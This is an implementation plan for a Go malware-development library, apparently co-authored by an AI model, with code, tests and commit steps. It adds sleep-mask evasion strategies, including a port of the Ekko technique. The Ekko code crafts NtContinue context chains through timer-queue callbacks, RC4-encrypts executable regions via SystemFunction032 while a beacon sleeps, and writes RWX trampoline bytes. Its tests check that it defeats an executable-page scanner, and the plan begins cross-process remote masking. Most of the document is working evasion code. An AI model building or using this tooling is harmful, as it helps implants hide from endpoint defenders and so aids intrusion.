		timerQueueCallbackAddr(),
		uintptr(unsafe.Pointer(state)),
		0, // DueTime: fire immediately
		0, // Period: one-shot
		wtExecuteLongFunction|wtExecuteDefault,
	)
	if r1 == 0 {
		return fmt.Errorf("sleepmask/timerqueue: CreateTimerQueueTimer: %w", lastErr)
	}

	// Wait for the pool thread to finish, or ctx cancel.
	const INVALID_HANDLE_VALUE = ^uintptr(0)
	waitResult, _, _ := api.ProcWaitForSingleObject.Call(uintptr(hDone), uintptr(windows.INFINITE))
	if waitResult != 0 /* WAIT_OBJECT_0 */ {
		// Shouldn't happen with INFINITE, but handle defensively.
		api.ProcDeleteTimerQueueTimer.Call(0, uintptr(hTimer), INVALID_HANDLE_VALUE)
		return fmt.Errorf("sleepmask/timerqueue: unexpected wait result 0x%x", waitResult)
	}

	// Use a short-circuit ctx check: if ctx was cancelled during the pool
	// thread's wait, we still waited for decrypt to finish (pool thread's
	// WaitForSingleObject on hDummy timed out naturally or we couldn't
	// interrupt it — acceptable for L2 light). Signal ctx.Err if relevant.
	api.ProcDeleteTimerQueueTimer.Call(0, uintptr(hTimer), INVALID_HANDLE_VALUE)

	if state.err != nil {
		return state.err
	}
	if ctx.Err() != nil {
		return ctx.Err()
	}
	return nil
}
```

- [ ] **Step 2: Write the non-Windows stub**

```go
//go:build !windows

package sleepmask

import (
	"context"
	"errors"
	"time"
)

type TimerQueueStrategy struct{}

func (*TimerQueueStrategy) Cycle(ctx context.Context, regions []Region, cipher Cipher, key []byte, d time.Duration) error {
	return errors.New("sleepmask: TimerQueueStrategy requires Windows")
}
```

- [ ] **Step 3: Build**

```bash
go build ./evasion/sleepmask/
GOOS=windows GOARCH=amd64 go build ./evasion/sleepmask/
```

Expected: both green.

### Task 2.4 — Run the VM tests for TimerQueueStrategy

- [ ] **Step 1: VM test**

```bash
./scripts/vm-run-tests.sh windows "./evasion/sleepmask/..." "-v -count=1 -timeout 60s -run TestTimerQueueStrategy"
```

Expected: `TestTimerQueueStrategy_CycleRoundTrip` PASS, `TestTimerQueueStrategy_CtxCancellation` PASS.

### Task 2.5 — Extend the e2e test to loop over the 3 (so far 2) strategies

**Files:**
- Modify: `evasion/sleepmask/sleepmask_e2e_windows_test.go`

- [ ] **Step 1: Add a strategies helper at the top of the file**

Insert after the imports:

```go
// e2eStrategies lists every strategy the e2e suite asserts the
// "masked window is opaque" invariant against. Extended as new
// strategies are shipped.
func e2eStrategies() []struct {
	name string
	ctor func() Strategy
} {
	return []struct {
		name string
		ctor func() Strategy
	}{
		{"inline", func() Strategy { return &InlineStrategy{} }},
		{"timerqueue", func() Strategy { return &TimerQueueStrategy{} }},
	}
}
```

- [ ] **Step 2: Refactor `TestSleepMaskE2E_DefeatsExecutablePageScanner` into a sub-test loop**

Change the top of the existing function from:

```go
func TestSleepMaskE2E_DefeatsExecutablePageScanner(t *testing.T) {
	payload := testutil.WindowsSearchableCanary
	addr, cleanup := allocAndWriteRX(t, payload)
	defer cleanup()
	// ... existing body ...
}
```

to:

```go
func TestSleepMaskE2E_DefeatsExecutablePageScanner(t *testing.T) {
	for _, strat := range e2eStrategies() {
		strat := strat
		t.Run(strat.name, func(t *testing.T) {
			payload := testutil.WindowsSearchableCanary
			addr, cleanup := allocAndWriteRX(t, payload)
			defer cleanup()
			// ... existing body, replacing `mask := New(...)` with:
			mask := New(Region{Addr: addr, Size: uintptr(len(payload))}).WithStrategy(strat.ctor())
			// ... rest unchanged ...
		})
	}
}
```

- [ ] **Step 3: Run on VM**

```bash
./scripts/vm-run-tests.sh windows "./evasion/sleepmask/..." "-v -count=1 -timeout 60s -run TestSleepMaskE2E_DefeatsExecutablePageScanner"
```

Expected: `TestSleepMaskE2E_DefeatsExecutablePageScanner/inline` and `TestSleepMaskE2E_DefeatsExecutablePageScanner/timerqueue` both PASS.

### Task 2.6 — Commit

- [ ] **Step 1: Stage + commit**

```bash
git add win/api/dll_windows.go \
        evasion/sleepmask/strategy_timerqueue_windows.go \
        evasion/sleepmask/strategy_timerqueue_stub.go \
        evasion/sleepmask/strategy_timerqueue_windows_test.go \
        evasion/sleepmask/sleepmask_e2e_windows_test.go
git -c user.name="oioio-space" -c user.email="oioio-space@users.noreply.github.com" commit -m "$(cat <<'MSG'
feat(sleepmask): TimerQueueStrategy L2-light (v0.12.0 part 2/5)

Pool-thread variant of the sleep-mask cycle. The encrypt/wait/decrypt
runs entirely on a Windows thread-pool worker scheduled via
CreateTimerQueueTimer; the caller goroutine blocks on an auto-reset
completion event. Adds ProcDeleteTimerQueueTimer to win/api.

Not true Ekko — the caller goroutine is still in a Wait syscall. For
the real thing (beacon thread RIP inside VirtualProtect /
SystemFunction032 / WaitForSingleObjectEx via NtContinue chain), see
EkkoStrategy in the following commit.

Co-Authored-By: Claude Sonnet 4.6 (1M context) <noreply@anthropic.com>
MSG
)"
```

---

## COMMIT 3 — EkkoStrategy (L2 full)

This commit is the largest and most delicate. Read the spec's "EkkoStrategy (L2 full)" section carefully before starting.

### Task 3.1 — Add 5 missing procs to `win/api/dll_windows.go`

**Files:**
- Modify: `win/api/dll_windows.go`

- [ ] **Step 1: Find the existing DLL blocks**

```bash
grep -n "^var (" win/api/dll_windows.go
grep -n "= Ntdll.NewProc\|= Kernel32.NewProc\|= Advapi32" win/api/dll_windows.go | head -5
```

Expected: shows where existing Ntdll, Kernel32, and Advapi32 procs are declared.

- [ ] **Step 2: Add the 5 new procs in alphabetical order within their DLL groups**

Edit to insert (adapt to the existing alphabetical sort):

```go
	// In Ntdll group:
	ProcNtContinue              = Ntdll.NewProc("NtContinue")
	ProcRtlCaptureContext       = Ntdll.NewProc("RtlCaptureContext")

	// In Kernel32 group:
	ProcDeleteTimerQueueEx      = Kernel32.NewProc("DeleteTimerQueueEx")
	ProcExitThread              = Kernel32.NewProc("ExitThread")

	// Advapi32 group (may not exist yet — add declaration if missing):
	Advapi32                    = windows.NewLazySystemDLL("advapi32.dll")
	ProcSystemFunction032       = Advapi32.NewProc("SystemFunction032")
```

- [ ] **Step 3: Verify build**

```bash
GOOS=windows GOARCH=amd64 go build ./...
```

Expected: green.

### Task 3.2 — Write the plan9 asm `resumeStub`

**Files:**
- Create: `evasion/sleepmask/strategy_ekko_amd64.s`

- [ ] **Step 1: Write the file**

```asm
// +build windows,amd64

#include "textflag.h"

// func resumeStub()
// The last NtContinue in the Ekko chain lands a pool thread here.
// The thread is not known to the Go runtime — we must NOT enter any
// Go function. Steps:
//   1. Load the resume-event handle from ·ekkoResumeEvent
//   2. Call SetEvent(handle) via ·ekkoProcSetEvent
//   3. Call ExitThread(0) via ·ekkoProcExitThread
//
// Calling convention: Windows x64 — RCX = first arg, shadow space 0x20 on stack.
TEXT ·resumeStub(SB), NOSPLIT|NOFRAME, $0
	SUBQ $0x28, SP
	MOVQ ·ekkoResumeEvent(SB), CX
	MOVQ ·ekkoProcSetEvent(SB), AX
	CALL AX
	MOVQ $0, CX
	MOVQ ·ekkoProcExitThread(SB), AX
	CALL AX
	INT3 // unreachable — ExitThread does not return
```

- [ ] **Step 2: Verify it assembles**

```bash
GOOS=windows GOARCH=amd64 go vet ./evasion/sleepmask/... 2>&1 | head -5
```

Expected: no asm errors. The `undefined symbol` errors for `ekkoResumeEvent` etc. are OK — they'll be defined in the next task.

### Task 3.3 — Implement EkkoStrategy scaffold (state, globals, resume hook)

**Files:**
- Create: `evasion/sleepmask/strategy_ekko_windows.go` (initial skeleton)

- [ ] **Step 1: Write the scaffold (Cycle method will be filled in next tasks)**

```go
//go:build windows && amd64

package sleepmask

import (
	"context"
	"errors"
	"fmt"
	"runtime"
	"sync/atomic"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"

	"github.com/oioio-space/maldev/win/api"
)

// EkkoStrategy is the L2-full strategy: a faithful port of Peter
// Winter-Smith's Ekko. Six CONTEXTs are crafted so that a chain of
// CreateTimerQueueTimer(NtContinue, &ctxN) diverts the pool thread
// through VirtualProtect(RW), SystemFunction032 (RC4 encrypt),
// WaitForSingleObjectEx (the actual sleep), SystemFunction032
// (decrypt), VirtualProtect(restore), and finally a resume stub that
// signals completion + exits. During the wait, the beacon thread's
// RIP sits inside VirtualProtect or SystemFunction032 or
// WaitForSingleObjectEx — never in Sleep/SleepEx.
//
// Constraints:
//   - windows + amd64 only (plan9 asm resume stub)
//   - Cipher must be *RC4Cipher (chain hardcodes SystemFunction032)
//   - runtime.LockOSThread is held during Cycle (the captured CONTEXT
//     must correspond to a stable OS thread)
type EkkoStrategy struct{}

//go:linkname resumeStub github.com/oioio-space/maldev/evasion/sleepmask.resumeStub
func resumeStub()

// Globals captured by the asm resume stub. Assigned before the first
// CreateTimerQueueTimer call of a Cycle.
var (
	ekkoResumeEvent    uintptr
	ekkoProcSetEvent   uintptr
	ekkoProcExitThread uintptr
)

// Re-used chainDone flag between the main and pool threads.
var ekkoChainDone atomic.Int32

func (s *EkkoStrategy) Cycle(ctx context.Context, regions []Region, cipher Cipher, key []byte, d time.Duration) error {
	rc4, ok := cipher.(*RC4Cipher)
	if !ok {
		return fmt.Errorf("sleepmask/ekko: requires *RC4Cipher cipher, got %T", cipher)
	}
	_ = rc4 // used in the gadget stack construction (next task)

	if len(regions) != 1 {
		return errors.New("sleepmask/ekko: MVP supports exactly one region; multi-region chain is future work")
	}
	region := regions[0]

	runtime.LockOSThread()
	defer runtime.UnlockOSThread()

	hCompletion, err := windows.CreateEvent(nil, 0 /* auto-reset */, 0, nil)
	if err != nil {
		return fmt.Errorf("sleepmask/ekko: CreateEvent completion: %w", err)
	}
	defer windows.CloseHandle(hCompletion)
	hDummy, err := windows.CreateEvent(nil, 1 /* manual-reset */, 0, nil)
	if err != nil {
		return fmt.Errorf("sleepmask/ekko: CreateEvent dummy: %w", err)
	}
	defer windows.CloseHandle(hDummy)

	// Globals for the asm resume stub — captured BEFORE the chain starts.
	ekkoResumeEvent = uintptr(hCompletion)
	ekkoProcSetEvent = api.ProcSetEvent.Addr()
	ekkoProcExitThread = api.ProcExitThread.Addr()

	// Placeholder: chain construction lives in Task 3.4.
	_ = region
	_ = key
	_ = d
	_ = unsafe.Pointer(nil)

	return errors.New("sleepmask/ekko: chain construction not yet implemented (Task 3.4)")
}
```

- [ ] **Step 2: Write the non-(windows+amd64) stub**

```go
//go:build !(windows && amd64)

package sleepmask

import (
	"context"
	"errors"
	"time"
)

type EkkoStrategy struct{}

func (*EkkoStrategy) Cycle(ctx context.Context, regions []Region, cipher Cipher, key []byte, d time.Duration) error {
	return errors.New("sleepmask: EkkoStrategy requires Windows amd64")
}
```

File path: `evasion/sleepmask/strategy_ekko_stub.go`

- [ ] **Step 3: Build check**

```bash
go build ./evasion/sleepmask/
GOOS=windows GOARCH=amd64 go build ./evasion/sleepmask/
GOOS=windows GOARCH=386 go build ./evasion/sleepmask/
GOOS=linux GOARCH=amd64 go build ./evasion/sleepmask/
```

Expected: all build clean. The Cycle method returns the placeholder error; that's fine for now.

### Task 3.4 — Implement the 6-CONTEXT chain construction

**Files:**
- Modify: `evasion/sleepmask/strategy_ekko_windows.go`

The goal: fill in the chain construction that was left as a placeholder in Task 3.3. Lay out the gadget stack, clone the main CONTEXT 6 times, schedule the 6 timers.

- [ ] **Step 1: Design the gadget stack layout in a comment**

Add a block comment at the top of the file explaining the layout we settled on:

```go
// Gadget stack layout (one contiguous buffer per Cycle call):
//
//   +0x000  [trampoline bytes: 48 bytes of raw x64 code]
//           MOVQ ctxSlot(RIP), CX       48 8B 0D ?? ?? ?? ??
//           MOVQ $NtContinue, AX        48 B8 ?? ?? ?? ?? ?? ?? ?? ??
//           JMP  AX                     FF E0
//           INT3 (padding)              CC CC CC
//   +0x030  [ctxSlot pointers: 6 × 8 bytes] — filled with &ctxN+1 addresses
//   +0x060  [shadow space & return frames: 6 × 0x30 bytes, Rsp bases per gadget]
//
// Each ctxN.Rsp = base of shadow region i. [Rsp+0x00] = &trampoline i.
// After gadget N's `ret`, the trampoline reads ctxSlot[N+1] (= &ctxN+1)
// into RCX and jumps to NtContinue.
```

- [ ] **Step 2: Declare the structures for the chain**

Add below the globals:

```go
// ekkoChain holds the 6 CONTEXTs + gadget stack for one Cycle.
type ekkoChain struct {
	ctxMain     api.Context64
	ctxProtRW   api.Context64
	ctxEncrypt  api.Context64
	ctxWait     api.Context64
	ctxDecrypt  api.Context64
	ctxProtRX   api.Context64
	ctxResume   api.Context64

	// Raw bytes region (RWX) containing trampolines + ctx-slot table +
	// per-gadget shadow space. Freed via VirtualFree after the chain.
	scratch     uintptr
	scratchSize uintptr

	// Pre-computed offsets within scratch:
	trampBase      uintptr // trampoline code region
	ctxSlotTable   uintptr // 6 × uintptr holding &ctx{next}
	gadgetStackAt  func(i int) uintptr // returns &shadow[i]
}
```

Refer to the spec for full per-field meaning.

- [ ] **Step 3: Implement the chain build helper**

Add (below `tqCallback`):

```go
// buildEkkoChain lays out the gadget stack, clones ctxMain into 6
// CONTEXTs, and wires each Rip/Rsp/Rcx/Rdx/R8/R9 for the corresponding
// gadget. Must be called AFTER RtlCaptureContext(&ch.ctxMain) and
// BEFORE the timers are scheduled.
func buildEkkoChain(
	ch *ekkoChain,
	region Region,
	key []byte,
	d time.Duration,
	hDummy windows.Handle,
	origProtectPtr *uint32,
) error {
	// Allocate one RWX scratch buffer: 48 bytes trampoline × 6 + 8 × 6
	// ctx-slot + 0x30 × 6 shadow = ~720 bytes.
	ch.scratchSize = 4096
	addr, err := windows.VirtualAlloc(0, ch.scratchSize,
		windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_EXECUTE_READWRITE)
	if err != nil {
		return fmt.Errorf("buildEkkoChain: VirtualAlloc scratch: %w", err)
	}
	ch.scratch = addr
	ch.trampBase = addr
	ch.ctxSlotTable = addr + 0x1E0 // (48 × 6) rounded
	shadowBase := addr + 0x240
	ch.gadgetStackAt = func(i int) uintptr { return shadowBase + uintptr(i)*0x30 }

	// --- Build the ctx-slot table (6 pointers) ---
	slots := unsafe.Slice((*uintptr)(unsafe.Pointer(ch.ctxSlotTable)), 6)
	slots[0] = uintptr(unsafe.Pointer(&ch.ctxProtRW))
	slots[1] = uintptr(unsafe.Pointer(&ch.ctxEncrypt))
	slots[2] = uintptr(unsafe.Pointer(&ch.ctxWait))
	slots[3] = uintptr(unsafe.Pointer(&ch.ctxDecrypt))
	slots[4] = uintptr(unsafe.Pointer(&ch.ctxProtRX))
	slots[5] = uintptr(unsafe.Pointer(&ch.ctxResume))

	// --- Write trampoline bytes for each of the 6 gadgets ---
	ntContinueAddr := api.ProcNtContinue.Addr()
	for i := 0; i < 6; i++ {
		tr := ch.trampBase + uintptr(i)*0x30
		b := unsafe.Slice((*byte)(unsafe.Pointer(tr)), 0x30)
		// MOVQ ctxSlot[i](RIP), CX  — RIP-relative load
		// 48 8B 0D <rel32>
		b[0] = 0x48
		b[1] = 0x8B
		b[2] = 0x0D
		rel := int32(int64(ch.ctxSlotTable+uintptr(i)*8) - int64(tr+7))
		*(*int32)(unsafe.Pointer(&b[3])) = rel
		// MOVQ $NtContinue, AX
		// 48 B8 <u64>
		b[7] = 0x48
		b[8] = 0xB8
		*(*uint64)(unsafe.Pointer(&b[9])) = uint64(ntContinueAddr)
		// JMP AX (FF E0)
		b[17] = 0xFF
		b[18] = 0xE0
	}

	// --- Clone ctxMain 6× and patch Rip/args/Rsp ---
	region64 := func(r Region) (uint64, uint64) { return uint64(r.Addr), uint64(r.Size) }

	// Gadget 0: VirtualProtect(addr, size, PAGE_READWRITE, &origProtect)
	ch.ctxProtRW = ch.ctxMain
	ch.ctxProtRW.Rip = uint64(api.ProcVirtualProtect.Addr())
	ch.ctxProtRW.Rcx, ch.ctxProtRW.Rdx = region64(region)
	ch.ctxProtRW.R8 = uint64(windows.PAGE_READWRITE)
	ch.ctxProtRW.R9 = uint64(uintptr(unsafe.Pointer(origProtectPtr)))
	ch.ctxProtRW.Rsp = uint64(ch.gadgetStackAt(0))
	// Place &trampoline[1] at [Rsp+0x00] (return hook).
	*(*uintptr)(unsafe.Pointer(ch.gadgetStackAt(0))) = ch.trampBase + 0x30

	// Gadget 1: SystemFunction032 — RC4 encrypt in place.
	// Uses UNICODE_STRING-shaped structs for both data and key; layout in shadow:
	//   [Rsp+0x00] = return to trampoline 2
	//   [Rsp+0x10] = dataUSTR { Length, Max, Pad, Buffer }
	//   [Rsp+0x20] = keyUSTR  { Length, Max, Pad, Buffer }
	// RCX = &dataUSTR, RDX = &keyUSTR
	writeUSTR := func(at uintptr, length uint16, buf uintptr) {
		*(*uint16)(unsafe.Pointer(at)) = length
		*(*uint16)(unsafe.Pointer(at + 2)) = length
		*(*uint32)(unsafe.Pointer(at + 4)) = 0
		*(*uintptr)(unsafe.Pointer(at + 8)) = buf
	}
	rspEnc := ch.gadgetStackAt(1)
	writeUSTR(rspEnc+0x10, uint16(region.Size), region.Addr)
	writeUSTR(rspEnc+0x20, uint16(len(key)), uintptr(unsafe.Pointer(&key[0])))
	*(*uintptr)(unsafe.Pointer(rspEnc)) = ch.trampBase + 2*0x30
	ch.ctxEncrypt = ch.ctxMain
	ch.ctxEncrypt.Rip = uint64(api.ProcSystemFunction032.Addr())
	ch.ctxEncrypt.Rcx = uint64(rspEnc + 0x10)
	ch.ctxEncrypt.Rdx = uint64(rspEnc + 0x20)
	ch.ctxEncrypt.Rsp = uint64(rspEnc)

	// Gadget 2: WaitForSingleObjectEx(hDummy, d_ms, FALSE)
	rspW := ch.gadgetStackAt(2)
	*(*uintptr)(unsafe.Pointer(rspW)) = ch.trampBase + 3*0x30
	ch.ctxWait = ch.ctxMain
	ch.ctxWait.Rip = uint64(api.ProcWaitForSingleObjectEx.Addr())
	ch.ctxWait.Rcx = uint64(hDummy)
	ch.ctxWait.Rdx = uint64(d / time.Millisecond)
	ch.ctxWait.R8 = 0
	ch.ctxWait.Rsp = uint64(rspW)

	// Gadget 3: SystemFunction032 — RC4 decrypt (self-inverse, same args).
	rspDec := ch.gadgetStackAt(3)
	writeUSTR(rspDec+0x10, uint16(region.Size), region.Addr)
	writeUSTR(rspDec+0x20, uint16(len(key)), uintptr(unsafe.Pointer(&key[0])))
	*(*uintptr)(unsafe.Pointer(rspDec)) = ch.trampBase + 4*0x30
	ch.ctxDecrypt = ch.ctxMain
	ch.ctxDecrypt.Rip = uint64(api.ProcSystemFunction032.Addr())
	ch.ctxDecrypt.Rcx = uint64(rspDec + 0x10)
	ch.ctxDecrypt.Rdx = uint64(rspDec + 0x20)
	ch.ctxDecrypt.Rsp = uint64(rspDec)

	// Gadget 4: VirtualProtect(addr, size, origProtect, &tmp)
	rspRX := ch.gadgetStackAt(4)
	*(*uintptr)(unsafe.Pointer(rspRX)) = ch.trampBase + 5*0x30
	ch.ctxProtRX = ch.ctxMain
	ch.ctxProtRX.Rip = uint64(api.ProcVirtualProtect.Addr())
	ch.ctxProtRX.Rcx, ch.ctxProtRX.Rdx = region64(region)
	ch.ctxProtRX.R8 = uint64(*origProtectPtr)
	ch.ctxProtRX.R9 = uint64(uintptr(unsafe.Pointer(origProtectPtr)))
	ch.ctxProtRX.Rsp = uint64(rspRX)

	// Gadget 5: resumeStub (asm). No args. Rsp needs shadow space anyway.
	rspResume := ch.gadgetStackAt(5)
	*(*uintptr)(unsafe.Pointer(rspResume)) = 0 // no further ret needed; resumeStub ExitThreads
	ch.ctxResume = ch.ctxMain
	ch.ctxResume.Rip = uint64(uintptr(unsafe.Pointer(&resumeStub)))
	ch.ctxResume.Rsp = uint64(rspResume)

	return nil
}
```

- [ ] **Step 4: Build check**

```bash
GOOS=windows GOARCH=amd64 go build ./evasion/sleepmask/
```

Expected: green.

### Task 3.5 — Wire the timers into Cycle

**Files:**
- Modify: `evasion/sleepmask/strategy_ekko_windows.go`

Replace the placeholder in `Cycle` with the actual scheduling + capture + wait sequence.

- [ ] **Step 1: Replace the Cycle body**

```go
func (s *EkkoStrategy) Cycle(ctx context.Context, regions []Region, cipher Cipher, key []byte, d time.Duration) error {
	if _, ok := cipher.(*RC4Cipher); !ok {
		return fmt.Errorf("sleepmask/ekko: requires *RC4Cipher cipher, got %T", cipher)
	}
	if len(regions) != 1 {
		return errors.New("sleepmask/ekko: MVP supports exactly one region; multi-region chain is future work")
	}
	region := regions[0]

	runtime.LockOSThread()
	defer runtime.UnlockOSThread()

	hCompletion, err := windows.CreateEvent(nil, 0, 0, nil)
	if err != nil {
		return fmt.Errorf("sleepmask/ekko: CreateEvent completion: %w", err)
	}
	defer windows.CloseHandle(hCompletion)
	hDummy, err := windows.CreateEvent(nil, 1, 0, nil)
	if err != nil {
		return fmt.Errorf("sleepmask/ekko: CreateEvent dummy: %w", err)
	}
	defer windows.CloseHandle(hDummy)

	// Globals for the asm resume stub.
	ekkoResumeEvent = uintptr(hCompletion)
	ekkoProcSetEvent = api.ProcSetEvent.Addr()
	ekkoProcExitThread = api.ProcExitThread.Addr()

	ekkoChainDone.Store(0)

	var chain ekkoChain
	// 1. Capture current thread state; ctxMain.Rip = the next instruction.
	r, _, _ := api.ProcRtlCaptureContext.Call(uintptr(unsafe.Pointer(&chain.ctxMain)))
	_ = r

	// 2. If this is the SECOND entry (we're the pool thread after the chain),
	//    go straight to SetEvent + ExitThread and bail.
	if ekkoChainDone.Load() == 1 {
		api.ProcSetEvent.Call(uintptr(hCompletion))
		api.ProcExitThread.Call(0)
		// Unreachable
	}
	ekkoChainDone.Store(1)

	// 3. Build the chain.
	var origProtect uint32
	if err := buildEkkoChain(&chain, region, key, d, hDummy, &origProtect); err != nil {
		return err
	}
	defer windows.VirtualFree(chain.scratch, 0, windows.MEM_RELEASE)

	// 4. Create a queue + 6 timers.
	var hQueue windows.Handle
	r1, _, lastErr := api.ProcCreateTimerQueue.Call()
	if r1 == 0 {
		return fmt.Errorf("sleepmask/ekko: CreateTimerQueue: %w", lastErr)
	}
	hQueue = windows.Handle(r1)

	ntContinueAddr := api.ProcNtContinue.Addr()
	contexts := []*api.Context64{
		&chain.ctxProtRW, &chain.ctxEncrypt, &chain.ctxWait,
		&chain.ctxDecrypt, &chain.ctxProtRX, &chain.ctxResume,
	}
	delayMs := uint32(d / time.Millisecond)
	schedule := []uint32{100, 200, 300, 300 + delayMs + 100, 300 + delayMs + 200, 300 + delayMs + 300}

	var hTimers [6]windows.Handle
	for i, ctxPtr := range contexts {
		rc, _, cErr := api.ProcCreateTimerQueueTimer.Call(
			uintptr(unsafe.Pointer(&hTimers[i])),
			uintptr(hQueue),
			ntContinueAddr,
			uintptr(unsafe.Pointer(ctxPtr)),
			uintptr(schedule[i]),
			0,
			0, // WT_EXECUTEDEFAULT
		)
		if rc == 0 {
			return fmt.Errorf("sleepmask/ekko: CreateTimerQueueTimer gadget %d: %w", i, cErr)
		}
	}

	// 5. Wait for chain completion (with watchdog = d + 5s).
	watchdog := uint32(delayMs + 5000)
	api.ProcWaitForSingleObject.Call(uintptr(hCompletion), uintptr(watchdog))

	// 6. Cleanup — blocks until all pool callbacks finish.
	const INVALID_HANDLE_VALUE = ^uintptr(0)
	api.ProcDeleteTimerQueueEx.Call(uintptr(hQueue), INVALID_HANDLE_VALUE)

	if ctx.Err() != nil {
		return ctx.Err()
	}
	return nil
}
```

- [ ] **Step 2: Build**

```bash
GOOS=windows GOARCH=amd64 go build ./evasion/sleepmask/
```

Expected: green. The missing procs from Task 3.1 are referenced via `api.ProcXxx`.

- [ ] **Step 3: Quick compile verification of all build tag combinations**

```bash
go build ./evasion/sleepmask/
GOOS=linux GOARCH=amd64 go build ./evasion/sleepmask/
GOOS=windows GOARCH=amd64 go build ./evasion/sleepmask/
GOOS=windows GOARCH=386 go build ./evasion/sleepmask/
```

Expected: all green.

### Task 3.6 — EkkoStrategy RejectsNonRC4Cipher test

**Files:**
- Create: `evasion/sleepmask/strategy_ekko_windows_test.go`

- [ ] **Step 1: Write the test**

```go
//go:build windows && amd64

package sleepmask

import (
	"context"
	"testing"
	"time"
	"unsafe"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
	"golang.org/x/sys/windows"
)

func TestEkkoStrategy_RejectsNonRC4Cipher(t *testing.T) {
	mask := New(Region{Addr: 0x1000, Size: 100}).
		WithStrategy(&EkkoStrategy{}).
		WithCipher(NewXORCipher())
	err := mask.Sleep(context.Background(), 10*time.Millisecond)
	require.Error(t, err)
	assert.Contains(t, err.Error(), "requires *RC4Cipher")
}

func TestEkkoStrategy_RejectsMultiRegion(t *testing.T) {
	mask := New(
		Region{Addr: 0x1000, Size: 100},
		Region{Addr: 0x2000, Size: 100},
	).WithStrategy(&EkkoStrategy{}).WithCipher(NewRC4Cipher())
	err := mask.Sleep(context.Background(), 10*time.Millisecond)
	require.Error(t, err)
	assert.Contains(t, err.Error(), "exactly one region")
}

func TestEkkoStrategy_CycleRoundTrip(t *testing.T) {
	data := []byte{0xDE, 0xAD, 0xBE, 0xEF, 0x41, 0x42, 0x43, 0x44}
	addr, err := windows.VirtualAlloc(0, uintptr(len(data)),
		windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_EXECUTE_READWRITE)
	require.NoError(t, err)
	defer windows.VirtualFree(addr, 0, windows.MEM_RELEASE)
	copy(unsafe.Slice((*byte)(unsafe.Pointer(addr)), len(data)), data)

	mask := New(Region{Addr: addr, Size: uintptr(len(data))}).
		WithStrategy(&EkkoStrategy{}).
		WithCipher(NewRC4Cipher())
	require.NoError(t, mask.Sleep(context.Background(), 100*time.Millisecond))

	restored := unsafe.Slice((*byte)(unsafe.Pointer(addr)), len(data))
	assert.Equal(t, data, []byte(restored), "bytes must round-trip through EkkoStrategy")
}
```

- [ ] **Step 2: Build the test**

```bash
GOOS=windows GOARCH=amd64 go test -c -o /tmp/ekko.exe ./evasion/sleepmask/
```

Expected: green.

### Task 3.7 — Run EkkoStrategy VM tests

- [ ] **Step 1: Run on VM**

```bash
./scripts/vm-run-tests.sh windows "./evasion/sleepmask/..." "-v -count=1 -timeout 120s -run TestEkkoStrategy"
```

Expected: all three PASS.

**If the round-trip test fails**: the chain has a bug. Likely culprits:
- RIP-relative rel32 in the trampoline bytes is miscomputed
- `ctxMain.Rsp` is inside Go's stack — the pool thread's jump to that Rsp stomps on a live goroutine stack. Fix: allocate a dedicated stack buffer for ctxResume instead of reusing ctxMain.Rsp.
- The resume stub's `ekkoResumeEvent` global isn't populated before the chain starts.

Debug with `MALDEV_INTRUSIVE=1` to unlock + verbose stdout.

### Task 3.8 — Extend e2e to include Ekko

**Files:**
- Modify: `evasion/sleepmask/sleepmask_e2e_windows_test.go`

- [ ] **Step 1: Update `e2eStrategies`**

```go
func e2eStrategies() []struct {
	name   string
	ctor   func() Strategy
	cipher Cipher // optional; if non-nil, forced on the mask
} {
	return []struct {
		name   string
		ctor   func() Strategy
		cipher Cipher
	}{
		{"inline", func() Strategy { return &InlineStrategy{} }, nil},
		{"timerqueue", func() Strategy { return &TimerQueueStrategy{} }, nil},
		{"ekko", func() Strategy { return &EkkoStrategy{} }, NewRC4Cipher()},
	}
}
```

- [ ] **Step 2: Thread the cipher through the existing `t.Run` loop in `TestSleepMaskE2E_DefeatsExecutablePageScanner`**

```go
mask := New(Region{Addr: addr, Size: uintptr(len(payload))}).WithStrategy(strat.ctor())
if strat.cipher != nil {
	mask = mask.WithCipher(strat.cipher)
}
```

- [ ] **Step 3: Run on VM**

```bash
./scripts/vm-run-tests.sh windows "./evasion/sleepmask/..." "-v -count=1 -timeout 120s -run TestSleepMaskE2E_DefeatsExecutablePageScanner"
```

Expected: inline / timerqueue / ekko subtests all PASS.

### Task 3.9 — Commit

- [ ] **Step 1: Stage + commit**

```bash
git add win/api/dll_windows.go \
        evasion/sleepmask/strategy_ekko_windows.go \
        evasion/sleepmask/strategy_ekko_amd64.s \
        evasion/sleepmask/strategy_ekko_stub.go \
        evasion/sleepmask/strategy_ekko_windows_test.go \
        evasion/sleepmask/sleepmask_e2e_windows_test.go
git -c user.name="oioio-space" -c user.email="oioio-space@users.noreply.github.com" commit -m "$(cat <<'MSG'
feat(sleepmask): EkkoStrategy L2-full (v0.12.0 part 3/5)

Pure-Go port of Peter Winter-Smith's Ekko (2022). Six CONTEXTs +
CreateTimerQueueTimer callbacks bound to NtContinue divert a pool
thread through VirtualProtect(RW) → SystemFunction032 (RC4 encrypt) →
WaitForSingleObjectEx → SystemFunction032 (decrypt) →
VirtualProtect(restore) → resumeStub. The beacon thread's RIP sits
inside real Windows APIs during the sleep, never in Sleep/SleepEx.

windows+amd64 only. 20-line plan9 asm resume stub (SetEvent +
ExitThread, no Go runtime re-entry). MVP restricts to one region and
RC4Cipher — multi-region is future work, XOR/AES cannot be wired into
the ROP chain without additional gadgets.

Adds to win/api: NtContinue, RtlCaptureContext, SystemFunction032,
ExitThread, DeleteTimerQueueEx.

Co-Authored-By: Claude Sonnet 4.6 (1M context) <noreply@anthropic.com>
MSG
)"
```

---

## COMMIT 4 — RemoteMask + RemoteInlineStrategy

### Task 4.1 — Cross-platform types

**Files:**
- Create: `evasion/sleepmask/remote_mask.go`

- [ ] **Step 1: Write the file**

```go
package sleepmask

import (
	"context"
	"crypto/rand"
	"fmt"
	"time"

	"github.com/oioio-space/maldev/cleanup/memory"
)

// RemoteRegion identifies a memory range inside another process.
// Handle must carry at least PROCESS_VM_OPERATION | PROCESS_VM_WRITE
// | PROCESS_VM_READ.
type RemoteRegion struct {
	Handle uintptr // windows.Handle on Windows; opaque uintptr for cross-platform compile
	Addr   uintptr
	Size   uintptr
}

// RemoteStrategy is the cross-process analog of Strategy. Cycle receives
// RemoteRegions and uses VirtualProtectEx / ReadProcessMemory /
// WriteProcessMemory instead of VirtualProtect + in-place writes.
type RemoteStrategy interface {
